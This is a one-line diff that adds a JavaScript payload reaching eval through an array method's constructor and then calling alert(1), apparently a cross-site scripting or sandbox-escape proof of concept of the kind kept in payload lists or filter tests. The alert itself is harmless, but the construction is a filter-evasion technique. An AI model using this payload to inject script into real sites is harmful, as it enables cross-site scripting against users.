@@ -1,0 +1,1 @@
+[]['at']['constructor']('return eval')()('alert(1)')
